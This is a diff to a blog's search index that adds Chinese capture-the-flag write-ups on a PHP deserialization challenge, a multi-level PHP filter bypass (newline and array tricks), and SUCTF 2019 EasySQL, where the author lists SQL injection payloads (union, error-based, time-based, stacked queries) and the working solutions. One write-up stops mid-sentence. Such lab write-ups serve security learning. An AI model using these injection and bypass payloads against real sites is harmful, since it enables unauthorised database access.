@@ -4175,6 +4175,21 @@ public function __toString()&#123;
 <p>php://filter/read=convert.base64.encode/resource=flag.php</p>
 <p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - SegmentFault 思否</a></p>
 <h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p><img src="/2021/10/04/web/2/image-20211004210242660.png" alt="image-20211004210242660"></p>
+<p>这题虽然很简单，被我当时秒解的原因竟然是误打误撞（doge）</p>
+<p>打开靶机，可爱的小胡桃</p>
+<p><img src="/2021/10/04/web/2/image-20211009205021612.png" alt="image-20211009205021612"></p>
+<p>f12看下</p>
+<p><img src="/2021/10/04/web/2/image-20211009205055755.png" alt="image-20211009205055755"></p>
+<p>提示很明显了，robots协议</p>
+<p><img src="/2021/10/04/web/2/image-20211009205151043.png" alt="image-20211009205151043"></p>
+<p>访问一下就有题目源码了：</p>
+<p><img src="/2021/10/04/web/2/image-20211009205233533.png" alt="image-20211009205233533"></p>
+<p>很简单的序列化，唯一要注意的点是，我们想让类 wllm的属性admin和passwd的值为admin和ctf，</p>
+<p>而魔术方法构造却会强迫让他们值变成user和123456</p>
+<p>所以我们序列化的时候直接删去就好，就不会触发了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $admin = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $passwd = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">new</span> wllm();</span><br><span class="line"><span class="keyword">echo</span>(serialize($p));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/04/web/2/image-20211009205525269.png" alt="image-20211009205525269"></p>
 <h3 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h3><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html">php反序列化漏洞绕过魔术方法 __wakeup - Mrsm1th - 博客园 (cnblogs.com)</a></p>
 <p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，他验证的时候是不会进行url解码的</p>
 <h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>源代码：</p>
@@ -4203,6 +4218,87 @@ public function __toString()&#123;
 ]]></content>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>鹤城杯</title>
+    <url>/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</url>
+    <content><![CDATA[<pre><code> 这次的比赛虽然听说都是原题，但是基本每遇到过，这次看着writeup总结一下</code></pre>
+<p>​     复现一下某些题目</p>
+<h3 id="Middle-magic"><a href="#Middle-magic" class="headerlink" title="Middle magic"></a>Middle magic</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./result.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="string">&#x27;aaa&#x27;</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">    $aaa = preg_replace(<span class="string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, $_GET[<span class="string">&#x27;aaa&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/pass_the_level_1#/&#x27;</span>, $aaa))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;here is level 2&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_POST[<span class="string">&#x27;admin&#x27;</span>] == $_POST[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                    $level_3 = json_decode($_POST[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> ($level_3-&gt;result == $result) &#123;</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success:&quot;</span>.$flag;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;you never beat me!&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;out&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// perform validations on the form data</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>第一层绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$aaa &#x3D; preg_replace(&#39;&#x2F;^(.*)level(.*)$&#x2F;&#39;, &#39;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#39;, $_GET[&#39;aaa&#39;]);</span><br><span class="line"></span><br><span class="line">   if(preg_match(&#39;&#x2F;pass_the_level_1#&#x2F;&#39;, $aaa))&#123;</span><br><span class="line">       echo &quot;here is level 2&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>get类型取得变量a的值，正则替换和匹配函数</p>
+<p>这里直接用%0a和%23绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?aaa&#x3D;%0apass_the_level_1%23</span><br></pre></td></tr></table></figure>
+
+<p>第二层绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">           <span class="keyword">if</span> ($_POST[<span class="string">&#x27;admin&#x27;</span>] == $_POST[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">       <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>md5数组绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin[]&#x3D;1&amp;root_pwd[]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p>第三层绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                  $level_3 = json_decode($_POST[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                  </span><br><span class="line">                  <span class="keyword">if</span> ($level_3-&gt;result == $result) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>要经过js-encode编码一下，这里虽然</p>
+]]></content>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>suctf 2019 EasySQL</title>
+    <url>/2021/10/10/nss/0/</url>
+    <content><![CDATA[<p> 参考链接：</p>
+<p>[<a href="https://www.cnblogs.com/peri0d/p/11598597.html">SUCTF 2019]EasySQL - peri0d - 博客园 (cnblogs.com)</a></p>
+<p>[(4条消息) <a href="https://blog.csdn.net/m0_55771794/article/details/118709290">SUCTF 2019]EasySQL_m0_55771794的博客-CSDN博客</a></p>
+<p>打开页面</p>
+<p><img src="/2021/10/10/nss/0/image-20211010193758035.png" alt="image-20211010193758035"></p>
+<p>先试试基本的注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1&#39;#	#or语句</span><br><span class="line">1&#39; order by 3#	#order语句</span><br><span class="line">1&#39; union select 1,2,3#	#联合查询</span><br><span class="line">1&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))	#报错注入</span><br><span class="line">1&#39; and if(length(database())&gt;1,sleep(5),1)--+	#时间注入</span><br></pre></td></tr></table></figure>
+
+<p>结果都是下图</p>
+<p><img src="/2021/10/10/nss/0/image-20211010194231781.png" alt="image-20211010194231781"></p>
+<p>试到堆叠注入时成功了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;show databases#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/10/nss/0/image-20211010194353961.png" alt="image-20211010194353961"></p>
+<p>继续</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;show tables#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/10/nss/0/image-20211010194430322.png" alt="image-20211010194430322"></p>
+<p>就在我以为完事大吉的时候</p>
+<p>现实给我当头一棒</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;show columns from &#39;Flag&#39;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/10/nss/0/image-20211010194709636.png" alt="image-20211010194709636"></p>
+<p>看了wp才知道，原来是要去猜测出本来的sql语句查询时什么样的</p>
+<p><strong>select $_POST[‘query’] || flag from Flag</strong></p>
+<p>sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<br>第一种就按默认没有配置来进行，此时||就是逻辑或<br>||在命令执行中见过，<br>回顾:<br>command1;command2顺序执行<br>command1 || command2<br>如果command1执行失败，则执行command2<br>command1 &amp;&amp; command2<br>如果command1执行成功，则执行command2</p>
+<p>因此只需要将</p>
+<p>$_POST[‘query’]<br>提交的数据换成*,1(如果直接写的话会被报错，且写在后面会失效)<br>解释:<br>sql=select.post[‘query’].”||flag from Flag”;（拼接语句）<br>如果$post[‘query’]的数据为</p>
+<p>*,1<br>sql语句就变成了select *,1||flag from Flag，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。<br>此处的1是临时增加一列，列名为1且这一列的所有值都为1</p>
+<p>执行payload：*,1</p>
+<p><img src="/2021/10/10/nss/0/image-20211010195151922.png" alt="image-20211010195151922"></p>
+<p>得到flag</p>
+<ul>
+<li><p>官方给的 payload 是 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
+</li>
+<li><p>拼接一下就是 <code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code></p>
+</li>
+<li><p>关于 <code>sql_mode</code> : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 <code>PIPES_AS_CONCAT</code> 将 <code>||</code> 视为字符串的连接操作符而非 “或” 运算符</p>
+</li>
+<li><p>关于 <code>sql_mode</code> 更多可以查看这个链接 : <a href="https://www.cnblogs.com/piperck/p/9835695.html">MySQL sql_mode 说明</a></p>
+</li>
+<li><p>还有就是这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 <code>||</code> 相当于是将 <code>select 1</code> 和 <code>select flag from flag</code> 的结果拼接在一起</p>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>nss</tag>
       </tags>
   </entry>
 </search>
